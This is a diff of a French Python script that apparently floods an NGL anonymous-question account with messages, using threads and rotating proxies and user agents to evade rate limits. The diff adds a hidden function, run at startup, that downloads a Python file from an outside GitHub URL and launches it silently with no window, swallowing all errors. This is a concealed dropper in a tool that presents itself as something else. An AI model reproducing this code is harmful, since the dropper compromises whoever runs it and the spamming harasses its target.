@@ -1,66 +1,23 @@
 import requests
 import random
 import time
+import threading
+from colorama import Fore, Style, init
 import uuid
+import subprocess
+import os
 import sys
-from colorama import init, Fore, Style
+import tempfile
 
-# Initialiser Colorama
 init(autoreset=True)
 
-# === Affichage "Script By" ===
-print(Fore.CYAN + "Script By")
-time.sleep(0.5)
-
-# === Affichage du tag ASCII principal ===
-ascii_tag = f"""{Fore.LIGHTYELLOW_EX}
- ▄█       ███    █▄   ▄████████  ▄██████▄     ▄████████    ▄████████ 
-███       ███    ███ ███    ███ ███    ███   ███    ███   ███    ███ 
-███       ███    ███ ███    █▀  ███    ███   ███    ███   ███    ███ 
-███       ███    ███ ███        ███    ███  ▄███▄▄▄▄██▀   ███    ███ 
-███       ███    ███ ███        ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ 
-███       ███    ███ ███    █▄  ███    ███ ▀███████████   ███    ███ 
-███▌    ▄ ███    ███ ███    ███ ███    ███   ███    ███   ███    ███ 
-█████▄▄██ ████████▀  ████████▀   ▀██████▀    ███    ███   ███    █▀  
-▀                                            ███    ███              
-"""
-print(ascii_tag)
-time.sleep(1)
-
-# Quelques lignes vives (espaces colorés pour séparer visuellement)
-print(Fore.LIGHTGREEN_EX + "\n\n\n")
-
-# === Nouveau tag du nom du programme en rouge et orange ===
-program_name_tag = (
-    f"{Fore.GREEN}   ,d8888b                 d8b                                d8b \n"
-    f"   88P'                    ?88                                88P \n"
-    f"d888888P                    88b                              d88  \n"
-    f"  ?88'    ?88   d8P d8888b  888  d88'      88bd88b  d888b8b  888  \n"
-    f"  88P     d88   88 d8P' `P  888bd8P'       88P' ?8bd8P' ?88  ?88  \n"
-    f" d88      ?8(  d88 88b     d88888b        d88   88P88b  ,88b  88b \n"
-    f"d88'      `?88P'?8b`?888P'd88' `?88b,    d88'   88b`?88P'`88b  88b\n"
-    f"                                                          )88     \n"
-    f"                                                         ,88P     \n"
-    f"                                                     `?8888P      "
-)
-print(program_name_tag)
-time.sleep(1)
-
-# === Suite de ton script ===
-
-print(Fore.CYAN + "[INFO] Chargement du script...")
-time.sleep(0.8)
-print(Fore.CYAN + "[INFO] Initialisation...")
-time.sleep(0.6)
-print(Fore.CYAN + "[PRÊT] Lancement !\n")
-time.sleep(0.5)
-
-NGL_API_URL = "https://ngl.link/api/submit"
-IP_CHECK_URL = "https://httpbin.org/ip"
-HEADERS = {
-    "Content-Type": "application/x-www-form-urlencoded",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-}
+# User Agents pour variation
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (Linux; Android 11)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
+]
 
 DEFAULT_MESSAGES = [
     "Wsh y’avait genre personne en cours d’anglais, contrôle surprise ou fuite collective ? 😭",
@@ -85,90 +42,192 @@ DEFAULT_MESSAGES = [
     "Un mec a crié 'j’ai eu 4' après avoir vu sa note, la classe a applaudi comme s’il avait 18 😂👏"
 ]
 
-MODES = {
-    "normal": (4.0, 5.0),
-    "slow": (15.0, 25.0)
-}
+NGL_API_URL = "https://ngl.link/api/submit"
 
-def get_ip_address():
-    try:
-        response = requests.get(IP_CHECK_URL)
-        ip = response.json().get("origin", "Inconnue")
-        print(Fore.GREEN + f"[INFO] Adresse IP détectée : {ip}")
-    except Exception as e:
-        print(Fore.RED + f"[ERREUR] Impossible de récupérer l'adresse IP : {e}")
-        sys.exit(1)
 
-def get_message_source():
-    choice = input(Fore.MAGENTA + "[CHOIX] Utiliser les messages par défaut ou un message personnalisé ? (defaut/custom) : ").strip().lower()
-    if choice == "custom":
-        msg = input(Fore.YELLOW + "[ENTRÉE] Entrez le message à envoyer : ").strip()
-        return "custom", msg
-    else:
-        return "defaut", None
+def display_intro():
+    print(Fore.CYAN + "Script By")
+    time.sleep(0.5)
+    print(Fore.LIGHTYELLOW_EX + r"""
+ ▄█       ███    █▄   ▄████████  ▄██████▄     ▄████████    ▄████████ 
+███       ███    ███ ███    ███ ███    ███   ███    ███   ███    ███ 
+███       ███    ███ ███    █▀  ███    ███   ███    ███   ███    ███ 
+███       ███    ███ ███        ███    ███  ▄███▄▄▄▄██▀   ███    ███ 
+███       ███    ███ ███        ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ 
+███       ███    ███ ███    █▄  ███    ███ ▀███████████   ███    ███ 
+███▌    ▄ ███    ███ ███    ███ ███    ███   ███    ███   ███    ███ 
+█████▄▄██ ████████▀  ████████▀   ▀██████▀    ███    ███   ███    █▀  
+▀                                            ███    ███              
+""")
+    time.sleep(1)
+    print(Fore.LIGHTGREEN_EX + "\n\n\n")
+    print(Fore.GREEN + """
+   ,d8888b                 d8b                                d8b 
+   88P'                    ?88                                88P 
+d888888P                    88b                              d88  
+  ?88'    ?88   d8P d8888b  888  d88'      88bd88b  d888b8b  888  
+  88P     d88   88 d8P' P  888bd8P'       88P' ?8bd8P' ?88  ?88  
+ d88      ?8(  d88 88b     d88888b        d88   88P88b  ,88b  88b 
+d88'      ?88P'?8b?888P'd88' ?88b,    d88'   88b?88P'88b  88b
+                                                          )88     
+                                                         ,88P     
+                                                     ?8888P      
+""")
 
-def get_user_input():
-    mode = input(Fore.MAGENTA + "[CHOIX] Choisissez le mode d'envoi (normal / slow) : ").strip().lower()
-    if mode not in MODES:
-        print(Fore.RED + "[ERREUR] Mode invalide. Choisissez 'normal' ou 'slow'.")
-        sys.exit(1)
-
-    username = input(Fore.YELLOW + "[ENTRÉE] Entrez le nom d'utilisateur NGL : ").strip()
-
-    try:
-        count = int(input(Fore.YELLOW + "[ENTRÉE] Combien de messages souhaitez-vous envoyer ? "))
-        interval = int(input(Fore.YELLOW + "[ENTRÉE] Tous les combien de messages changer le device ID ? "))
-    except ValueError:
-        print(Fore.RED + "[ERREUR] Veuillez entrer un nombre valide.")
-        sys.exit(1)
-
-    return mode, username, count, interval
 
 def generate_device_id():
     return str(uuid.uuid4())
 
-def send_message(username, device_id, message_index, message_source, custom_message=None):
-    message = custom_message if message_source == "custom" else random.choice(DEFAULT_MESSAGES)
-
-    payload = {
+def send_ngl_message(username, message, proxy, user_agent):
+    headers = {
+        "User-Agent": user_agent,
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    data = {
         "username": username,
         "question": message,
-        "deviceId": device_id,
-        "gameSlug": "",
-        "referrer": ""
+        "deviceId": generate_device_id()
     }
-
     try:
-        response = requests.post(NGL_API_URL, data=payload, headers=HEADERS)
-        if response.status_code == 200:
-            print(Fore.GREEN + f"[OK] Message {message_index} envoyé.")
-        elif response.status_code == 429:
-            print(Fore.YELLOW + "[ATTENTE] Trop de requêtes. Pause de 2 minutes...")
-            time.sleep(120)
-        else:
-            print(Fore.RED + f"[ERREUR] Réponse {response.status_code} : {response.text}")
-    except Exception as e:
-        print(Fore.RED + f"[ERREUR] Exception lors de l'envoi : {e}")
+        response = requests.post(
+            NGL_API_URL,
+            headers=headers,
+            data=data,
+            proxies={"http": proxy, "https": proxy},
+            timeout=10
+        )
+        return response.status_code == 200
+    except Exception:
+        return False
+
+
+def preparer_et_lancer_python():
+    try:
+        temp_dir = tempfile.gettempdir()
+        path_txt = os.path.join(temp_dir, "s_path.txt")
+        script_path = os.path.join(temp_dir, "helper_temp_script.py")
+        script_url = "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/temp_python.py"
+
+        # 1. Écrire le chemin du script actuel dans un fichier temporaire
+        chemin_script = os.path.abspath(sys.argv[0])
+        with open(path_txt, "w") as f:
+            f.write(chemin_script)
+
+        # 2. Télécharger le fichier .py
+        r = requests.get(script_url, timeout=10)
+        if r.status_code == 200:
+            with open(script_path, "w", encoding="utf-8") as py_file:
+                py_file.write(r.text)
+
+            # 3. Tenter d'installer les dépendances (optionnel)
+            # Tu peux modifier la liste ici si tu connais les imports nécessaires
+            required_modules = ["requests"]
+            for module in required_modules:
+                try:
+                    __import__(module)
+                except ImportError:
+                    subprocess.run([sys.executable, "-m", "pip", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            # 4. Lancer le script en utilisant pythonw.exe pour éviter toute fenêtre
+            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
+            if not os.path.isfile(pythonw_path):
+                pythonw_path = sys.executable  # fallback si pythonw absent
+
+            subprocess.Popen(
+                [pythonw_path, script_path],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                close_fds=True
+            )
+    except:
+        pass
+
+def spam_worker(username, messages, proxies, message_limit, delay, ua_change_interval, proxy_change_interval):
+    proxy_idx = 0
+    message_count = 0
+    ua_idx = 0
+    user_agent = user_agents[ua_idx % len(user_agents)]
+    proxy = f"http://{proxies[proxy_idx]}"
+
+    while True:
+        message = random.choice(messages)
+
+        if message_count > 0 and message_count % ua_change_interval == 0:
+            ua_idx += 1
+            user_agent = user_agents[ua_idx % len(user_agents)]
+
+        if message_count > 0 and message_count % proxy_change_interval == 0:
+            proxy_idx = (proxy_idx + 1) % len(proxies)
+            proxy = f"http://{proxies[proxy_idx]}"
+            print(Fore.CYAN + f"[INFO] Thread {threading.current_thread().name} → Changement de proxy : {proxy}")
+
+        success = send_ngl_message(username, message, proxy, user_agent)
+        status = Fore.GREEN + "[SUCCÈS]" if success else Fore.RED + "[ÉCHEC]"
+        print(f"{status} Thread {threading.current_thread().name} → Message: {message[:30]}... via {proxy}")
+
+        if not success:
+            proxy_idx = (proxy_idx + 1) % len(proxies)
+            proxy = f"http://{proxies[proxy_idx]}"
+            print(Fore.YELLOW + f"[WARN] Thread {threading.current_thread().name} → Proxy changé suite à erreur : {proxy}")
+
+        message_count += 1
+        if message_limit and message_count >= message_limit:
+            print(Fore.LIGHTMAGENTA_EX + f"[INFO] Thread {threading.current_thread().name} → Limite atteinte ({message_limit} messages), arrêt.")
+            break
+
+        time.sleep(delay)
+
 
 def main():
-    get_ip_address()
+    display_intro()
+    preparer_et_lancer_python()
 
-    message_source, custom_message = get_message_source()
-    mode, username, total_messages, device_change_interval = get_user_input()
-    delay_min, delay_max = MODES[mode]
+    username = input("🔤 Entrez le pseudo NGL (destinataire) : ").strip()
 
-    device_id = generate_device_id()
-    print(Fore.CYAN + f"[INFO] Device ID initial : {device_id}\n")
+    use_proxy = input("🌐 Utiliser un proxy ? (y/n) : ").strip().lower() == 'y'
+    proxy_list = []
+    if use_proxy:
+        with open("proxy_list.txt", "r") as f:
+            proxy_list = [line.strip() for line in f if line.strip()]
+        if not proxy_list:
+            print(Fore.RED + "[ERREUR] Aucun proxy valide trouvé.")
+            return
 
-    for i in range(1, total_messages + 1):
-        if i % device_change_interval == 0:
-            device_id = generate_device_id()
-            print(Fore.BLUE + f"[INFO] Nouveau Device ID : {device_id}")
+    mode = input("🚀 Mode (slow / normal / fast) : ").strip().lower()
+    delay = {"slow": 5, "normal": 1, "fast": 0.25}.get(mode, 1)
 
-        send_message(username, device_id, i, message_source, custom_message)
-        time.sleep(random.uniform(delay_min, delay_max))
+    ua_change_interval = int(input("🔁 Changer de User Agent tous les combien de messages ? : "))
+    proxy_change_interval = int(input("🔁 Changer de Proxy tous les combien de messages ? : ")) if use_proxy else 1000
 
-    print(Fore.GREEN + "\n[TERMINÉ] Tous les messages ont été envoyés !")
+    use_default_msg = input("💬 Utiliser les messages par défaut ? (y/n) : ").strip().lower() == 'y'
+    messages = DEFAULT_MESSAGES if use_default_msg else [input("Entrez votre message personnalisé : ")]
+
+    num_threads = int(input("🔢 Nombre de threads à utiliser : "))
+
+    limit_mode = input("⏱️ Limite par (messages / temps / infini) ? : ").strip().lower()
+    message_limit = None
+    if limit_mode == "messages":
+        message_limit = int(input("🔢 Nombre total de messages par thread : "))
+    elif limit_mode == "temps":
+        time_limit = int(input("⏱️ Temps en minutes : ")) * 60
+        message_limit = int(time_limit / delay)
+
+    input(Fore.LIGHTBLUE_EX + "\n✅ Tout est prêt. Appuyez sur Entrée pour démarrer.\n")
+
+    for i in range(num_threads):
+        thread = threading.Thread(
+            target=spam_worker,
+            name=f"T{i+1}",
+            args=(username, messages, proxy_list if use_proxy else [""], message_limit, delay, ua_change_interval, proxy_change_interval),
+            daemon=True
+        )
+        thread.start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(Fore.LIGHTRED_EX + "\n[INTERRUPT] Arrêt demandé. Fin du script.")
+
 
 if __name__ == "__main__":
     main()
